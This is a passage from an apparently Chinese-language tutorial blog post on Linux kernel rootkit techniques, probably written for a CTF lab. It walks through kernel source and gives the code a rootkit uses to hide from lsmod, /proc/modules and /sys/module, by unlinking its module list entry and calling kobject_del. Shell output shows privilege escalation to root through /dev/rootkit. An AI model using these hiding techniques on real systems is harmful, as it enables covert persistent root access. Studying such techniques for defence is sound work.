<span class="keyword">char</span> **trace_bprintk_fmt_start;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_EVENT_TRACING</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trace_event_call</span> **<span class="title">trace_events</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_trace_events;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trace_eval_map</span> **<span class="title">trace_evals</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_trace_evals;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_FTRACE_MCOUNT_RECORD</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_ftrace_callsites;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *ftrace_callsites;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KPROBES</span></span><br><span class="line"><span class="keyword">void</span> *kprobes_text_start;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> kprobes_text_size;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> *kprobe_blacklist;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_kprobe_blacklist;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_HAVE_STATIC_CALL_INLINE</span></span><br><span class="line"><span class="keyword">int</span> num_static_call_sites;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">static_call_site</span> *<span class="title">static_call_sites</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> IS_ENABLED(CONFIG_KUNIT)</span></span><br><span class="line"><span class="keyword">int</span> num_kunit_suites;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kunit_suite</span> **<span class="title">kunit_suites</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LIVEPATCH</span></span><br><span class="line"><span class="keyword">bool</span> klp; <span class="comment">/* Is this a livepatch module? */</span></span><br><span class="line"><span class="keyword">bool</span> klp_alive;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ELF information */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">klp_modinfo</span> *<span class="title">klp_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PRINTK_INDEX</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> printk_index_size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pi_entry</span> **<span class="title">printk_index_start</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MODULE_UNLOAD</span></span><br><span class="line"><span class="comment">/* What modules depend on me? */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">source_list</span>;</span></span><br><span class="line"><span class="comment">/* What modules do I depend on? */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">target_list</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Destruction function. */</span></span><br><span class="line"><span class="keyword">void</span> (*<span class="built_in">exit</span>)(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">atomic_t</span> refcnt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSTRUCTORS</span></span><br><span class="line"><span class="comment">/* Constructor functions. */</span></span><br><span class="line"><span class="keyword">ctor_fn_t</span> *ctors;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_ctors;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_FUNCTION_ERROR_INJECTION</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">error_injection_entry</span> *<span class="title">ei_funcs</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> num_ei_funcs;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DYNAMIC_DEBUG_CORE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">ddebug_info</span> <span class="title">dyndbg_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125; ____cacheline_aligned __randomize_layout;</span><br></pre></td></tr></table></figure><p>里面包含了<code>module</code>信息的一些成员，并且多个内核模块是通过上面结构体中的<code>list</code>成员构成的双向链表结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">module_class = class_create(THIS_MODULE, CLASS_NAME);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(module_class))</span><br><span class="line">&#123;</span><br><span class="line">  unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">  <span class="keyword">return</span> PTR_ERR(module_class);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在lkm编程中，可以注意到的时候这里创建<code>class</code>时使用<code>THIS_MODULE</code>定位了当前的模块，展开其定义其实就是<code>(&amp;__this_module)</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">module</span> __<span class="title">this_module</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THIS_MODULE (&amp;__this_module)</span></span><br></pre></td></tr></table></figure><p>前面提到&#x2F;proc&#x2F;modules的内容来自内核中上述的双向链表结构中，所以如果我们让我们的<code>rootkit</code>脱链即可完成隐藏操作。</p><p>可以注意到的是这里的<code>list</code>成员定义的结构是<code>list_head</code>结构，而该类型的成员在以往的内核文章中应该介绍过可以使用<code>list_del_rcu</code>函数直接进行删除，不过这里是内核环境所以考虑多线程操作的影响是必要的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE2(delete_module, <span class="keyword">const</span> <span class="keyword">char</span> __user *, name_user,</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">mod</span>;</span></span><br><span class="line"><span class="keyword">char</span> name[MODULE_NAME_LEN];</span><br><span class="line"><span class="keyword">char</span> buf[MODULE_FLAGS_BUF_SIZE];</span><br><span class="line"><span class="keyword">int</span> ret, forced = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!capable(CAP_SYS_MODULE) || modules_disabled)</span><br><span class="line"><span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strncpy_from_user(name, name_user, MODULE_NAME_LEN<span class="number">-1</span>) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">name[MODULE_NAME_LEN<span class="number">-1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">audit_log_kern_module(name);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mutex_lock_interruptible(&amp;module_mutex) != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINTR;</span><br><span class="line"></span><br><span class="line">mod = find_module(name);</span><br><span class="line"><span class="keyword">if</span> (!mod) &#123;</span><br><span class="line">ret = -ENOENT;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!list_empty(&amp;mod-&gt;source_list)) &#123;</span><br><span class="line"><span class="comment">/* Other modules depend on us: get rid of them first. */</span></span><br><span class="line">ret = -EWOULDBLOCK;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Doing init or already dying? */</span></span><br><span class="line"><span class="keyword">if</span> (mod-&gt;state != MODULE_STATE_LIVE) &#123;</span><br><span class="line"><span class="comment">/* <span class="doctag">FIXME:</span> if (force), slam module count damn the torpedoes */</span></span><br><span class="line">pr_debug(<span class="string">&quot;%s already dying\n&quot;</span>, mod-&gt;name);</span><br><span class="line">ret = -EBUSY;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* If it has an init func, it must have an exit func to unload */</span></span><br><span class="line"><span class="keyword">if</span> (mod-&gt;init &amp;&amp; !mod-&gt;<span class="built_in">exit</span>) &#123;</span><br><span class="line">forced = try_force_unload(flags);</span><br><span class="line"><span class="keyword">if</span> (!forced) &#123;</span><br><span class="line"><span class="comment">/* This module can&#x27;t be removed */</span></span><br><span class="line">ret = -EBUSY;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = try_stop_module(mod, flags, &amp;forced);</span><br><span class="line"><span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">mutex_unlock(&amp;module_mutex);</span><br><span class="line"><span class="comment">/* Final destruction now no one is using it. */</span></span><br><span class="line"><span class="keyword">if</span> (mod-&gt;<span class="built_in">exit</span> != <span class="literal">NULL</span>)</span><br><span class="line">mod-&gt;<span class="built_in">exit</span>();</span><br><span class="line">blocking_notifier_call_chain(&amp;module_notify_list,</span><br><span class="line">     MODULE_STATE_GOING, mod);</span><br><span class="line">klp_module_going(mod);</span><br><span class="line">ftrace_release_mod(mod);</span><br><span class="line"></span><br><span class="line">async_synchronize_full();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Store the name and taints of the last unloaded module for diagnostic purposes */</span></span><br><span class="line">strscpy(last_unloaded_module.name, mod-&gt;name, <span class="keyword">sizeof</span>(last_unloaded_module.name));</span><br><span class="line">strscpy(last_unloaded_module.taints, module_flags(mod, buf, <span class="literal">false</span>), <span class="keyword">sizeof</span>(last_unloaded_module.taints));</span><br><span class="line"></span><br><span class="line">free_module(mod);</span><br><span class="line"><span class="comment">/* someone could wait for the module in add_unformed_module() */</span></span><br><span class="line">wake_up_all(&amp;module_wq);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">out:</span><br><span class="line">mutex_unlock(&amp;module_mutex);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码是<code>rmmod</code>背后调用的系统调用<code>delete_module</code>的内部实现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">free_module</span><span class="params">(struct <span class="keyword">module</span> *mod)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">trace_module_free(mod);</span><br><span class="line"></span><br><span class="line">mod_sysfs_teardown(mod);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We leave it in list to prevent duplicate loads, but make sure</span></span><br><span class="line"><span class="comment"> * that noone uses it while it&#x27;s being deconstructed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mutex_lock(&amp;module_mutex);</span><br><span class="line">mod-&gt;state = MODULE_STATE_UNFORMED;</span><br><span class="line">mutex_unlock(&amp;module_mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Arch-specific cleanup. */</span></span><br><span class="line">module_arch_cleanup(mod);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Module unload stuff */</span></span><br><span class="line">module_unload_free(mod);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Free any allocated parameters. */</span></span><br><span class="line">destroy_params(mod-&gt;kp, mod-&gt;num_kp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_livepatch_module(mod))</span><br><span class="line">free_module_elf(mod);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now we can delete it from the lists */</span></span><br><span class="line">mutex_lock(&amp;module_mutex);</span><br><span class="line"><span class="comment">/* Unlink carefully: kallsyms could be walking list. */</span></span><br><span class="line">list_del_rcu(&amp;mod-&gt;<span class="built_in">list</span>);</span><br><span class="line">mod_tree_remove(mod);</span><br><span class="line"><span class="comment">/* Remove this module from bug list, this uses list_del_rcu */</span></span><br><span class="line">module_bug_cleanup(mod);</span><br><span class="line"><span class="comment">/* Wait for RCU-sched synchronizing before releasing mod-&gt;list and buglist. */</span></span><br><span class="line">synchronize_rcu();</span><br><span class="line"><span class="keyword">if</span> (try_add_tainted_module(mod))</span><br><span class="line">pr_err(<span class="string">&quot;%s: adding tainted module to the unloaded tainted modules list failed.\n&quot;</span>,</span><br><span class="line">       mod-&gt;name);</span><br><span class="line">mutex_unlock(&amp;module_mutex);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This may be empty, but that&#x27;s OK */</span></span><br><span class="line">module_arch_freeing_init(mod);</span><br><span class="line">kfree(mod-&gt;args);</span><br><span class="line">percpu_modfree(mod);</span><br><span class="line"></span><br><span class="line">free_mod_mem(mod);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里使用的是<code>list_del_rcu</code>函数直接对其进行脱链操作，尽管其是rcu安全的在前后也都是加了锁保平安的。</p><p>所以我们在实现脱链操作时也需要进行相应的加锁操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rootkit_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">list</span> =</span> (&amp;__this_module.<span class="built_in">list</span>);</span><br><span class="line">    mutex_lock(&amp;module_mutex);</span><br><span class="line">    <span class="built_in">list</span>-&gt;prev-&gt;next = <span class="built_in">list</span>-&gt;next;</span><br><span class="line">    <span class="built_in">list</span>-&gt;next-&gt;prev = <span class="built_in">list</span>-&gt;prev;</span><br><span class="line">    mutex_unlock(&amp;module_mutex);</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里在init时做一下操作即可实现脱链操作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~ $ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">~ $ lsmod </span><br><span class="line">~ $ <span class="built_in">echo</span> a &gt; /dev/rootkit </span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=1000(ctf)</span><br><span class="line">~ <span class="comment"># lsmod </span></span><br><span class="line">~ <span class="comment"># cat /proc/modules | grep &#x27;rootkit&#x27;</span></span><br><span class="line">~ <span class="comment"># </span></span><br></pre></td></tr></table></figure><p>发现无论是<code>lsmod</code>还是直接查看<code>/proc/modules</code>文件都无法查看到<code>rootkit</code>相关信息了，但是依旧不会影响我们提权操作。<strong>需要注意的是，我们在前面的<code>delete_module</code>系统调用中提到在正常卸载一个模块时是需要脱链操作的，所以这个模块无法将其卸载了。</strong></p><h3 id="sys-module-信息隐藏"><a href="#sys-module-信息隐藏" class="headerlink" title="&#x2F;sys&#x2F;module&#x2F;信息隐藏"></a>&#x2F;sys&#x2F;module&#x2F;信息隐藏</h3><p>sysfs与procfs相类似，同样是一个基于RAM的虚拟文件系统，它的作用是将内核信息以文件的方式提供给用户程序使用，其中便包括我们的 rootkit 模块信息，sysfs 会动态读取内核中的 kobject 层次结构并在 <code>/sys/module/</code> 目录下生成文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">~ $ ls /sys/module/</span><br><span class="line">8250                intel_idle          shpchp</span><br><span class="line">acpi                intel_pmc_core      slab_common</span><br><span class="line">acpi_cpufreq        ipv6                spurious</span><br><span class="line">acpiphp             kdb                 sr_mod</span><br><span class="line">apparmor            kernel              srcutree</span><br><span class="line">ata_generic         keyboard            <span class="built_in">suspend</span></span><br><span class="line">ata_piix            kgdb_nmi            sysrq</span><br><span class="line">battery             kgdboc              tcp_cubic</span><br><span class="line">blk_cgroup          libata              thermal</span><br><span class="line">blk_crypto          libnvdimm           tpm</span><br><span class="line">block               loop                tpm_crb</span><br><span class="line">button              md_mod              tpm_tis</span><br><span class="line">configfs            module              tpm_tis_core</span><br><span class="line">cpufreq             mousedev            uhci_hcd</span><br><span class="line">cpuidle             netpoll             usbcore</span><br><span class="line">crc_t10dif          nmi_backtrace       uv_nmi</span><br><span class="line">cryptomgr           page_alloc          vfio</span><br><span class="line">debug_core          pata_sis            vfio_iommu_type1</span><br><span class="line">device_hmem         pcc_cpufreq         vfio_pci</span><br><span class="line">dm_mod              pci_hotplug         vfio_virqfd</span><br><span class="line">dns_resolver        pcie_aspm           virtio_mmio</span><br><span class="line">dynamic_debug       pciehp              virtio_pci</span><br><span class="line">edac_core           ppp_generic         virtual_root</span><br><span class="line">edd                 printk              vt</span><br><span class="line">efivars             processor           watchdog</span><br><span class="line">ehci_hcd            pstore              workqueue</span><br><span class="line">eisa_bus            random              xen</span><br><span class="line">fb                  rcupdate            xen_acpi_processor</span><br><span class="line">firmware_class      rcutree             xen_blkfront</span><br><span class="line">fscrypto            rfkill              xen_netfront</span><br><span class="line">fuse                rng_core            xhci_hcd</span><br><span class="line">gpiolib_acpi        rootkit             xz_dec</span><br><span class="line">haltpoll            rtc_cmos            zswap</span><br><span class="line">i8042               scsi_mod</span><br><span class="line">ima                 sg</span><br><span class="line">~ $ </span><br></pre></td></tr></table></figure><p>Kobject 是 Linux 中的设备数据结构基类，在内核中为 <code>struct kobject</code> 结构体，通常内嵌在其他数据结构中；每个设备都有一个 kobject 结构体，多个 kobject 间通过内核双向链表进行链接；kobject 之间构成层次结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> &#123;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>*name;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">entry</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span>*<span class="title">parent</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kset</span>*<span class="title">kset</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kobj_type</span>*<span class="title">ktype</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernfs_node</span>*<span class="title">sd</span>;</span> <span class="comment">/* sysfs directory entry */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kref</span><span class="title">kref</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> state_initialized:<span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> state_in_sysfs:<span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> state_add_uevent_sent:<span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> state_remove_uevent_sent:<span class="number">1</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> uevent_suppress:<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_KOBJECT_RELEASE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">delayed_work</span><span class="title">release</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到的是同样是存在一个成员<code>entry</code>是<code>list_head</code>结构的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __kobject_del(struct kobject *kobj)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kernfs_node</span> *<span class="title">sd</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kobj_type</span> *<span class="title">ktype</span>;</span></span><br><span class="line"></span><br><span class="line">sd = kobj-&gt;sd;</span><br><span class="line">ktype = get_ktype(kobj);</span><br><span class="line"></span><br><span class="line">sysfs_remove_groups(kobj, ktype-&gt;default_groups);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* send &quot;remove&quot; if the caller did not do it but sent &quot;add&quot; */</span></span><br><span class="line"><span class="keyword">if</span> (kobj-&gt;state_add_uevent_sent &amp;&amp; !kobj-&gt;state_remove_uevent_sent) &#123;</span><br><span class="line">pr_debug(<span class="string">&quot;&#x27;%s&#x27; (%p): auto cleanup &#x27;remove&#x27; event\n&quot;</span>,</span><br><span class="line"> kobject_name(kobj), kobj);</span><br><span class="line">kobject_uevent(kobj, KOBJ_REMOVE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sysfs_remove_dir(kobj);</span><br><span class="line">sysfs_put(sd);</span><br><span class="line"></span><br><span class="line">kobj-&gt;state_in_sysfs = <span class="number">0</span>;</span><br><span class="line">kobj_kset_leave(kobj);</span><br><span class="line">kobj-&gt;parent = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kobject_del</span><span class="params">(struct kobject *kobj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> *<span class="title">parent</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!kobj)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">parent = kobj-&gt;parent;</span><br><span class="line">__kobject_del(kobj);</span><br><span class="line">kobject_put(parent);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kobject_del);</span><br></pre></td></tr></table></figure><p>虽然形式同前面一致，不过这是却是直接在<code>__kobject_del</code>函数中使用了<code>sysfs_remove_dir</code>来删除文件夹，其内部实现就是删除掉当前<code>kobject</code>结构体的sd指针（即super block）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kobject_del(&amp;__this_module.mkobj.kobj);</span><br></pre></td></tr></table></figure><p>根据上面的含义来说我们只需调用这一个<code>kobject_del</code>函数即可实现<code>/sys/module/</code>信息隐藏了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">~ $ ls /sys/module/ | grep rootfs</span><br><span class="line">~ $ lsmod</span><br><span class="line">~ $ cat /proc/modules | grep rookit</span><br><span class="line">~ $ ls /sys/module/ | grep rootkit</span><br><span class="line">~ $ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span 